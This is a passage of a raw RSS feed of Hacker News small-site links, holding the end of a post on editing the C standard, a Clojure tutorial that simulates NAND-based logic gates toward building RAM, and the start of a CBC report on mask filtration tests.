  <blockquote>
    <p>EXAMPLE An example of undefined behavior is the behavior on dereferencing a null pointer.</p>
  </blockquote>
</blockquote>

<p>I then take these recommendations/instructions/suggestions and then go beat the LaTeX up on your behalf. One of the biggest benefits of this is that you don’t have to know LaTeX. Or how to build the standard, or any part of that. The Project Editor is the “Layer of Indirection” between you and the actual text of the standard. This also means that I could, in theory, rewrite the entire Standard as a Microsoft Word Document, or rewrite the entire thing in restructuredText and not one of you would know the difference. Or, so that’s the ideal situation, anyhow. Unfortunately, following people’s Standard-editing directives are not always the most straight forward…</p>

<h3 id="instructions-unclear">Instructions Unclear?!</h3>

<p>Accidentally blew off foot.</p>

<p>What the hell does “3.4.3p4” mean? Well, I have to build the standard (or go look at an older one), figure out what section/paragraph you’re referring to, and then fix it. Normally, the C standard evolves at such a devastatingly snail-like pace that this is normally not a problem. However, doing this was a bit tough because of 3 meetings of backlogged changes. There were lots of overlaps between papers, and also just out-and-out strange descriptions for how to change some things that I did not understand at first. Weird nesting in the recent C Floating Point Group’s changes to the standard have been all sorts of fun to integrate.</p>

<p>“Delete these paragraphs, then add some here” okay, is that before or after the stuff you just asked me to destroy? Oh, I just applied a paper that deletes half of what you’re asking me to edit. Uh, well, I guess we’re going to have to brew up some interesting words on the fly…!</p>

<p>“Do these changes, and then make similar changes to the usual places” uh, what are “the usual places”? Guess it’s time to break out find/replace and figure out what the usual places are! Wait, hold on, you made these changes here, but… there’s identical wording somewhere else, am I supposed to edit that too…? Time to e-mail the author…</p>

<p>It’s an interesting bucket of challenges, really. I think one of the ways to help make it so I can more reliably know what sections to edit are by adding stable tags to the standard. C++ has done this and it means when someone says “edit <code>[alg.any.of]</code>”, you know where to go no matter what happens to the section and paragraph numbers. <code>25.6.2</code>… what’s that, what am I doing again?</p>

<p>Some frustrations go beyond just the papers’ contents, though.</p>

<h3 id="n2481-nooo-you-mean-n2553">N2481? Nooo, you mean N2553!</h3>

<p>One of the biggest problems in both the C and C++ Committees are history. C++ began to address this problem by using P-numbers for their papers, which are <code>PNNNNrXYZ</code> numbers that indicate both a paper uniquely and the revision of the paper (0, 1, 2, …) in the <code>XYZ</code> part. C has no such infrastructure: every paper is submitted, officially, to ISO and is given an N-number.</p>

<p>How do you track revision history? You hope the author puts it in the paper title or inside the paper itself. It’s basically up to the author to do this, and not all authors do it. This is a larger problem that is more strictly outside of my purview as Project Editor, but it is something that I am going to tackle anyways.</p>

<p>I had some inspiration thanks to the <a href="https://github.com/LynnKirby/wg14-link">work done by LynnKirby</a>, wherein Lynn created a <a href="https://wg14.link/">wg14.link website, similar to the wg21.link website</a>. This has given me a lot of insight into what people want out of a service like this, and how I should book keep papers and their metadata. Hopefully before Summer of 2021, I will be able to unveil a new way to track these papers and keep title, author, abstract, and history information and make the Paper Submission Process far more friendly to the wider C Community!</p>

<p>Still, this is a lot of rambling and anymore stuff will start to get way off topic to what it means to actually edit the C Standard. …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thephd.github.io/editing-the-c-standard">https://thephd.github.io/editing-the-c-standard</a></em></p>]]>
            </description>
            <link>https://thephd.github.io/editing-the-c-standard</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086673</guid>
            <pubDate>Fri, 13 Nov 2020 19:57:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating RAM in Clojure]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25086256">thread link</a>) | @stopachka
<br/>
November 13, 2020 | https://stopa.io/post/258 | <a href="https://web.archive.org/web/*/https://stopa.io/post/258">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><p>“Computers are all made out of logic gates”. We’ve heard that saying before. We also have a sense that logic gates are very simple machines, analogous to light switches even. This raises the question: <em>how exactly do kind-of-light-switches come together to form computers</em>? How does “storing a variable” or “calling a function” translate into logic gates going on or off? </p><p>On a journey to answer that question, I discovered J Clark Scott’s excellent book <a href="https://www.amazon.com/But-How-Know-Principles-Computers-ebook/dp/B00F25LEVC" target="_blank">“How do It Know?</a>”. He starts with NAND gates and takes you on a journey to build a computer using them.</p><p>I liked his book so much that I took his schematic for RAM, and simulated it in Clojure. In this essay, I’ll guide you through doing just that: we’ll simulate NAND gates, and use about <em>14 thousand</em> of them to build 256 bytes of RAM.</p><p>Going through this simulation ingrained an “aha” feeling in me: watching 14 thousand little machines chug away makes you feel that whoever uses a computer is a wizard. A wizard with an army of millions of machine servants doing billions of little jobs for them every second. I hope it gives you the same feeling. 🙂</p><p>To grok this essay, you need to understand this picture:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc" alt="image"></span></p><p>This describes a NAND gate. A NAND gate is a machine that has two input wires. If both input wires have a “high” charge (represented as 1), the output charge is “low” (represented as zero). With any other combination of input charges, the output charge is high.</p><p>Notice that the wires carry a charge, but we choose to interpret <em>meaning</em> in the charge. “high charge” means 1, and “low charge” means 0. Nothing changes in the machine, this is just something we decided as humans (1).</p><p>On the left you see a circuit diagram. You can read it as input wires <code>a</code> and <code>b</code> carrying charges into the <code>NAND</code> gate. The <code>NAND</code> gate has a wire <code>c</code>, carrying the output charge. For all the circuit diagrams we’ll draw, you can read them as electricity “flowing” from left to right, or top to bottom.</p><p>On the right is a “truth” table for a NAND gate. This is just a fancy name for summarizing every state a <code>NAND</code> gate can be, based on the input wires.</p><p>Now, we can start even lower than a <code>NAND gate</code>, but this machine is simple enough. It can’t be so hard to build something that turns off when two inputs are turned on. You don’t have to take my word for it though, you can search up “building a NAND gate with transistors”, and come back when you’re convinced. </p><p>Time to code! 🙂</p><p>First things first, we need some way to represent the state of our circuit. We know that our RAM will be built completely from <code>NAND</code> gates, so let’s take inspiration from one:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc" alt="image"></span></p><p>If we look at this example we can see that:</p><ol><li>We have wires. </li><li>Wires have charges.</li><li>We hook wires together with NAND Gates</li></ol><p>Here’s one way we can map that to a data structure in Clojure: </p><pre><code><span>(</span><span>def</span><span> ex-state-v0 {</span><span>:charge-map</span><span> {</span><span>:a</span><span> </span><span>1</span><span> </span><span>:b</span><span> </span><span>1</span><span> </span><span>:c</span><span> </span><span>0</span><span>}</span>
<span>                  </span><span>:nand-gates</span><span> [{</span><span>:ins</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>]</span>
<span>                                </span><span>:out</span><span> </span><span>:c</span><span>}]})</span></code></pre><p>We can use keywords to represent our wires. We can also keep a map that tells us the charges of our wires. Finally, we can keep a list of NAND gates, which tell us how these wires connect. </p><p>Fine enough way to represent our circuit for now! Let’s create a few functions that can help us manage this representation:</p><pre><code><span>; update state v0</span>
<span>; ---------------</span>
<!-- -->
<span>(</span><span>def</span><span> empty-state {</span><span>:charge-map</span><span> {} </span><span>:nand-gates</span><span> []})</span>
<!-- -->
<span>(</span><span>defn</span><span> charge [state wire]</span>
<span>  (</span><span>get-in</span><span> state [</span><span>:charge-map</span><span> wire]))</span>
<!-- -->
<span>(</span><span>defn</span><span> charges [state wires]</span>
<span>  (</span><span>map</span><span> (</span><span>partial</span><span> charge state) wires))</span>
<!-- -->
<span>(</span><span>defn</span><span> set-charge [state wire charge]</span>
<span>  (</span><span>assoc-in</span><span> state [</span><span>:charge-map</span><span> wire] charge))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire-nand-gate [state a b o]</span>
<span>  (</span><span>update</span><span> state </span><span>:nand-gates</span><span> conj {</span><span>:ins</span><span> [a b] </span><span>:out</span><span> o}))</span></code></pre><p>These are all the basic tools we need to “connect” a NAND gate into our circuit. Let’s try them out in the REPL:</p><pre><code><span>(</span><span>charges</span><span> (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>set-charge</span><span> </span><span>:a</span><span> </span><span>1</span><span>)</span>
<span>               (</span><span>set-charge</span><span> </span><span>:b</span><span> </span><span>0</span><span>))</span>
<span>           [</span><span>:a</span><span> </span><span>:b</span><span>])</span>
<span>; =&gt; (1 0)</span>
<span>(</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>)</span>
<span>; =&gt; {:charge-map {}, :nand-gates [{:ins [:a :b], :out :c}]}</span></code></pre><p>Nice! We can now “wire” up a circuit. Let’s run some electricity through it.</p><p>To figure out how to simulate electricity into our circuit, let’s remember our diagram again:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTU3LTk0NmYxYjAwLTBjOTItMTFlYi05NGZkLTNlM2JkMzI5OWYwNC5wbmc" alt="image"></span></p><p>One way we can model this is to imagine that electricity is like water: It “flows” from sources into wires, and “triggers” all the devices that are connected to those wires.</p><p>With a model like that, here’s what would happen if a charge was “triggered” on <code>a</code>:</p><ol><li>First, <code>a</code>‘s charge would update. </li><li>After that <code>a</code> ‘s charge would transfer to all the NAND gates that are connected to it. In this case, it would be our one NAND gate above.</li><li>Each NAND gate would then recompute its charge, and if it changed, trigger its output wire in turn. In our case that’s <code>c</code> </li><li>If <code>c</code> was connected to other <code>NAND</code> gates, those gates would trigger, and the process would continue.</li></ol><p>Now, this is a very naive view of how electricity works (2), but it’s good enough for us to model RAM!</p><p>Let’s translate this into code.</p><p>To do that, we need a way to model what a <code>NAND</code> gate does:</p><pre><code><span>(</span><span>defn</span><span> nand-output [a b]</span>
<span>  (</span><span>if</span><span> (</span><span>=</span><span> a b </span><span>1</span><span>) </span><span>0</span><span> </span><span>1</span><span>))</span></code></pre><pre><code><span>(</span><span>nand-output</span><span> </span><span>0</span><span> </span><span>0</span><span>)</span>
<span>; =&gt; 1</span>
<span>(</span><span>nand-output</span><span> </span><span>1</span><span> </span><span>1</span><span>)</span>
<span>; =&gt; 0</span></code></pre><p>Our <code>nand-output</code> function takes two input charges, and produces the output charge that a <code>NAND</code> gate would produce.</p><p>Next, we need a function to find all the <code>NAND</code> gates that are connected to a specific wire:</p><pre><code><span>(</span><span>defn</span><span> dependent-nand-gates [state wire]</span>
<span>  (</span><span>filter</span><span> </span>
<span>    (</span><span>fn</span><span> [{</span><span>:keys</span><span> [ins]}] (</span><span>some</span><span> #{wire} ins)) </span>
<span>    (</span><span>:nand-gates</span><span> state)))</span></code></pre><pre><code><span>(</span><span>dependent-nand-gates</span><span> (</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>) </span><span>:a</span><span>)</span>
<span>; =&gt; ({:ins [:a :b], :out :c})</span></code></pre><p>This searches all of our <code>NAND</code> gates in our circuit, and finds the ones which are connected to a specific wire.</p><p>With that, we have what we need to implement <code>trigger</code>:</p><pre><code><span>(</span><span>declare</span><span> trigger-nand-gate)</span>
<span>(</span><span>defn</span><span> trigger</span>
<span>  ([state wire new-v]</span>
<span>   (</span><span>let</span><span> [old-charge (</span><span>charge</span><span> state wire)</span>
<span>         state' (</span><span>set-charge</span><span> state wire new-v)</span>
<span>         new-charge (</span><span>charge</span><span> state' wire)]</span>
<span>     (</span><span>if</span><span> (</span><span>=</span><span> old-charge new-charge)</span>
<span>       state'</span>
<span>       (</span><span>reduce</span><span> (</span><span>fn</span><span> [acc-state out] (</span><span>trigger-nand-gate</span><span> acc-state out))</span>
<span>               state'</span>
<span>               (</span><span>dependent-nand-gates</span><span> state' wire))))))</span></code></pre><p>This follows exactly the model we described: </p><ol><li>Update the charge of the wire that was triggered </li><li>Find all the <code>NAND</code>  gates that the wire was connected too</li><li>Trigger those <code>NAND</code> gates if needed. </li></ol><p>What’s left is to implement what a  <code>NAND</code> gate does when it is triggered:</p><pre><code><span>(</span><span>defn</span><span> trigger-nand-gate</span>
<span>  [state {</span><span>:keys</span><span> [ins out]}]</span>
<span>  (</span><span>let</span><span> [new-charge (</span><span>apply</span><span> nand-output (</span><span>charges</span><span> state ins))]</span>
<span>    (</span><span>trigger</span><span> state out new-charge)))</span></code></pre><p>This calculates the new charge of a  <code>NAND</code> gate, and triggers the <code>output</code> wire with that charge. </p><p>Great, we have a way to simulate charges flowing through NAND gates! </p><p>One final helper function: let’s create something that will will let us “trigger” many wires: </p><pre><code><span>(</span><span>defn</span><span> trigger-many [state wires charges]</span>
<span>  (</span><span>reduce</span>
<span>    (</span><span>fn</span><span> [acc-state [wire charge]]</span>
<span>      (</span><span>trigger</span><span> acc-state wire charge))</span>
<span>    state</span>
<span>    (</span><span>map</span><span> vector wires charges)))</span></code></pre><p>We’ll want to do this so much that it’s good to have around.</p><p>We have what we need to simulate a simple charge flowing through a NAND gate. Let’s write a test for that:</p><pre><code><span>(</span><span>deftest</span><span> test-nand-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-nand-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"both a and b are on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures.</span></code></pre><p>Works like a charm! </p><p>What would happen, if we took a NAND gate, and fed the <em>same</em> wire in both inputs? </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTc3LTlkZjg4MzAwLTBjOTItMTFlYi04M2VmLTMwNDViYTQ1YWM5Mi5wbmc" alt="image"></span></p><p>Well, the output would end up being the opposite of its input. When <code>a</code> is zero, <code>c</code> is 1, when <code>a</code> is 1, <code>c</code> is 0. Boom, that happens to be a <code>NOT</code> gate. Here’s how that looks: </p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTk5LWEzZWU2NDAwLTBjOTItMTFlYi05YWFjLTYwM2E4MmQzNmVjNS5wbmc" alt="image"></span></p><p>To implement our <code>NOT</code> gate, we can do exactly as our diagram described: Feed the same wire to <em>both</em> inputs of a <code>NAND</code> gate: </p><pre><code><span>(</span><span>defn</span><span> wire-not-gate</span>
<span>  ([state a o]</span>
<span>   (</span><span>wire-nand-gate</span><span> state a a o)))</span></code></pre><p>🤯 1 line of code. If we test that out…</p><pre><code><span>(</span><span>deftest</span><span> test-not-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-not-gate</span><span> </span><span>:a</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>0</span><span>))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"a is off"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures</span></code></pre><p>It works! Onwards.</p><p>What if we plugged the output of one <code>NAND</code> as the input of a <code>NOT</code> gate?</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjQwLWI1ZDAwNzAwLTBjOTItMTFlYi04MzBhLWVjMzc1Zjk5Y2E1ZC5wbmc" alt="image"></span></p><p>Well, it would be opposite of a <code>NAND</code> gate: <code>d</code> would only be 1 when <em>both</em> <code>a</code> and <code>b</code> are 1. That’s the <code>AND</code> gate:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjU2LWJlMjg0MjAwLTBjOTItMTFlYi04N2Q2LTM0MTJhMDY4YWEyZS5wbmc" alt="image"></span></p><p>To implement <code>AND</code>, we can follow just that schematic: </p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o </span><span>:c</span><span>]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>This would work…almost. The tricky thing here is that inside the function we have an “intermediary” wire <code>c</code>, which connects the <code>NAND</code> gate and <code>NOT</code> gate. If we made <em>two</em> <code>AND</code> gates for example, then they would share the same wire <code>:c</code>! </p><p>To fix this, let’s write some helper functions to create unique wires: </p><pre><code><span>(</span><span>def</span><span> _u (</span><span>atom</span><span> {}))</span>
<span>(</span><span>defn</span><span> uniq-n [k]</span>
<span>  (</span><span>swap!</span><span> _u update k (</span><span>fn</span><span> [i] (</span><span>inc</span><span> (</span><span>or</span><span> i </span><span>0</span><span>))))</span>
<span>  (</span><span>get</span><span> @_u k))</span>
<!-- -->
<span>(</span><span>defn</span><span> kw [&amp; args]</span>
<span>  (</span><span>-&gt;&gt;</span><span> args</span>
<span>       (</span><span>map</span><span> (</span><span>fn</span><span> [x] (</span><span>if</span><span> ((</span><span>some-fn</span><span> keyword? symbol?) x)</span>
<span>                      (</span><span>name</span><span> x)</span>
<span>                      x)))</span>
<span>       (</span><span>apply</span><span> str)</span>
<span>       keyword))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire</span>
<span>  ([n]</span>
<span>   (</span><span>let</span><span> [i (</span><span>uniq-n</span><span> n)]</span>
<span>     (</span><span>if</span><span> (</span><span>&gt;</span><span> i </span><span>1</span><span>) (</span><span>kw</span><span> n </span><span>"#"</span><span> i) n))))</span></code></pre><p>Let’s see how it looks:</p><pre><code><span>[(</span><span>wire</span><span> </span><span>:a</span><span>) (</span><span>wire</span><span> </span><span>:a</span><span>)]</span>
<span>=&gt; [</span><span>:a</span><span> </span><span>:a#2</span><span>]</span></code></pre><p>Now if we create a wire with a name that already exists, it’ll add a nice little “#2” beside it. </p><p>Nice! Let’s use it in <code>wire-and-gate</code></p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o (</span><span>wire</span><span> (</span><span>kw</span><span> a b </span><span>:and-nand-o</span><span>))]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>If we test this out… </p><pre><code><span>(</span><span>deftest</span><span> test-and-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-and-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a and b on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; …</span></code></pre></span></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stopa.io/post/258">https://stopa.io/post/258</a></em></p>]]>
            </description>
            <link>https://stopa.io/post/258</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086256</guid>
            <pubDate>Fri, 13 Nov 2020 19:20:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twenty different masks tested. Here's what will best protect during the pandemic]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25085480">thread link</a>) | @pseudolus
<br/>
November 13, 2020 | https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Public health officials have said masks are critical to reducing the spread of COVID-19, but rigorous tests conducted on behalf of CBC's Marketplace found that while some work very well, others offer little protection from particles that transmit the novel coronavirus. And one type of mask can even spread the particles to others.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5795496.1604949380!/fileImage/httpImage/image.png_gen/derivatives/16x9_780/mask-grid.png"></p></div><figcaption>A selection of some of the masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure><p><span><p>Wearing a mask is critical to reducing the spread of COVID-19, but&nbsp;rigorous tests conducted on behalf of CBC's <em>Marketplace</em> found that while some work very well, others&nbsp;offer little protection from the particles that transmit the novel coronavirus. One type of mask can even spread those particles to others.</p>  <p>Months into the pandemic, there are still no standards for consumer masks. So <em>Marketplace</em> opted to compare more than two-dozen masks to what is commonly considered the gold standard in protecting health-care workers from infectious diseases like COVID-19 —&nbsp;the N95 mask.&nbsp;</p>  <p><em>Marketplace</em> purchased the masks in stores and online from a variety of sellers. The masks were also made out of varying materials and featured different designs.&nbsp;</p>  <p><em>Marketplace</em> put the masks through the rigorous National Institute for Occupational Safety and Health (NIOSH) standard test, conducted at a lower air-flow regimen to reflect normal breathing. The test is usually reserved for N95s and personal protective equipment (PPE) intended for health-care workers. A standard <a href="https://www.cdc.gov/niosh/npptl/stps/pdfs/TEB-APR-STP-0059-508.pdf"><u>NIOSH aerosol tes</u></a>t measures filtration efficiency, meaning the quantity of particles the mask filters out as the wearer breathes in.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_300/marketplace-masks-lab-tests.png 300w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_460/marketplace-masks-lab-tests.png 460w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_620/marketplace-masks-lab-tests.png 620w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png 780w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_1180/marketplace-masks-lab-tests.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png"></p></div><figcaption>An image shows leakage from an ill-fitting mask during Marketplace’s lab test at the University of Toronto’s Dalla Lana School of Public Health. <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>An N95 mask must have a 95 per cent filtration efficiency.&nbsp;</p>  <p>"This is the benchmark test. And it's actually useful because it allows us to compare consumer market masks to masks that we know a lot about," said&nbsp;James Scott, a professor from the University of Toronto's Dalla Lana School of Public Health. Scott is a specialist in bioaerosols and runs the lab where <em>Marketplace</em>'s tests were run.</p>  <ul>   <li><strong>Watch <em>Marketplace</em> Fridays at 8:00&nbsp;p.m., 8:30 p.m. NT, or stream&nbsp;any time&nbsp;on <a href="https://gem.cbc.ca/season/marketplace/season-47/8984c269-dae4-4a7b-b23a-d7df38647f09">CBC Gem</a></strong></li>  </ul>  <p>The test pulls a constant breath of air containing tiny salt particles through the mask material. The salt particles are similar in size to particles able to contain the coronavirus that might originate from droplets expelled by an infected person's breath, cough or sneeze. During the test, samples of air inside and outside the mask are compared to see how effective the mask is at reducing the level of particles.</p>  <p>Previous tests on consumer masks have commonly&nbsp;looked at how masks can help block particles&nbsp;when coughing or sneezing and&nbsp;prevent transmission to others.&nbsp;But the <em>Marketplace </em>test&nbsp;shows that certain materials make some masks better at limiting wearers'&nbsp;exposure by filtering what they&nbsp;breathe in, Scott said.</p>  <p>"Even fairly low-efficiency masks are actually quite effective at catching much larger particles. But, it takes a really good mask to catch the small ones as well. And we know that the virus will travel not only on the big ones but the small ones as well," said Scott.</p>  <p><em><strong>PHOTOS | A closer look at filtration efficiency of mask materials:</strong></em></p>    <h2>Results</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_300/masks-graphic.png 300w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_460/masks-graphic.png 460w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_620/masks-graphic.png 620w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png 780w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_1180/masks-graphic.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png"></p></div><figcaption> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Polypropylene fabric masks as good as N95</h2>  <p><em>Marketplace</em>'s test found some masks are just as good as an N95 when it comes to filtering out those potentially harmful particles, including one made with something called polypropylene fabric.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_300/polypropylene-mask.png 300w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_460/polypropylene-mask.png 460w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_620/polypropylene-mask.png 620w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png 780w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_1180/polypropylene-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png"></p></div><figcaption>A mask with an inner layer of melt-blown non-woven polypropylene and outer layers of cotton.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Polypropylene fabric, in this case, is a melt-blown, non-woven plastic fabric. Melt-blown, non-woven polypropylene (NWPP) is <a href="https://www.mckinsey.com/~/media/McKinsey/About%20Us/COVID%20Response%20Center/PDFs/COVID-19-PPE-Ops-Airway-Protection.pdf"><u>commonly used in surgical and N95 masks.</u></a></p>  <p>The consumer mask <em>Marketplace</em> tested with an inner layer of melt-blown, non-woven polypropylene fabric and outer layers of cotton had filtration efficiency rates as high as an N95. Scott said the combination of multiple materials contributed to the strong result.&nbsp;</p>  <p>"This is a really good example of multiple layers of different materials combining to make something greater than the sum of the parts," said Scott.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/blue-three-ply-mask.jpg 300w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/blue-three-ply-mask.jpg 